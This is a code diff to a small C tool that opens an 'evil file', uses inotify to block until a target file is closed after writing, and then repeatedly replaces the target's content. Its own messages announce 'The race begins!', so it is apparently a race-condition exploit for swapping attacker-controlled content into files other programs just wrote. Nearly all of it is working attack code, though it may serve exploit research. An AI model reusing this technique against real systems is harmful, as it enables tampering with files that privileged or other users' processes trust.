@@ -6,10 +6,13 @@
 #include <fcntl.h>
 #include <stdio.h>
 #include <sys/sendfile.h>
+#include <sys/inotify.h>
+#include <limits.h>
 
 #define D(str) do { fprintf(stderr, "efcr: " str "\n"); } while(0)
 
 int in_fd = -1;
+int inofd = -1;
 
 void __attribute__((noreturn)) usage(int ret)
 {
@@ -19,14 +22,32 @@ void __attribute__((noreturn)) usage(int ret)
 
 void open_evil_file(char *path)
 {
+	D("Opening evil file...");
 	in_fd = open(path, O_RDONLY);
 	assert(in_fd != -1);
-	D("evil file opened");
+	D("Evil file opened");
 }
 
 int check_for_close(char *path)
 {
-	D("file was just closed!");
+	int wd;
+	char buf[sizeof(struct inotify_event) + NAME_MAX + 1];
+
+	D("Initializing inotify fd...");
+	assert((inofd = inotify_init()) != -1);
+
+	D("Setting up inotify watch...");
+	wd = inotify_add_watch(inofd, path, IN_CLOSE_WRITE);
+	assert(wd != -1);
+
+	/* blocking wait until we receive an event */
+	read(inofd, &buf, sizeof(buf));
+
+	inotify_rm_watch(inofd, wd);
+	close(inofd);
+	inofd = -1;
+
+	D("file was just closed after writing! The race begins!");
 	return 1;
 }
 
@@ -49,7 +70,9 @@ int main(int argc, char *argv[])
 {
 	if(argc != 3)
 		usage(-1);
+
 	open_evil_file(argv[1]);
+
 	while(check_for_close(argv[2]))
 		replace_evil_content(argv[2]);
 	return EXIT_SUCCESS;
